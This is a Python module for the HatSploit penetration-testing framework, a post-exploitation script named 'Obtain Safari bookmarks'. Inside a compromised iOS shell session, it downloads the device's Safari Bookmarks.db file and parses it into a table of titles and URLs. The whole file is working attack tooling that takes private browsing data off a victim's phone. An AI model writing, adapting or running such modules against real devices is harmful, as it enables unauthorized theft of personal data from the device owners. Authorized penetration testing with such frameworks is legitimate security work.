#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module

from hatsploit.utils.session import SessionTools
from hatsploit.utils.db import DBTools


class HatSploitModule(Module, SessionTools, DBTools):
    details = {
        'Name': "Obtain Safari bookmarks",
        'Module': "post/apple_ios/shell/safari_bookmarks",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get iOS Safari bookmarks database and parse it.",
        'Platform': "apple_ios",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session",
            'Required': True
        }
    }

    def run(self):
        session = self.parse_options(self.options)

        bookmarks_path = '/private/var/mobile/Library/Safari/Bookmarks.db'
        local_path = self.session_download(session, bookmarks_path)

        if local_path:
            self.print_process("Parsing bookmarks database")

            try:
                bookmarks = self.parse_safari_bookmarks(local_path + 'Bookmarks.db')
            except Exception:
                self.print_error("Failed to parse bookmarks database!")
                return

            bookmarks_data = []
            for item in bookmarks:
                bookmarks_data.append((item['title'], item['url']))

            if bookmarks_data:
                self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
            else:
                self.print_warning("No bookmarks available on device.")
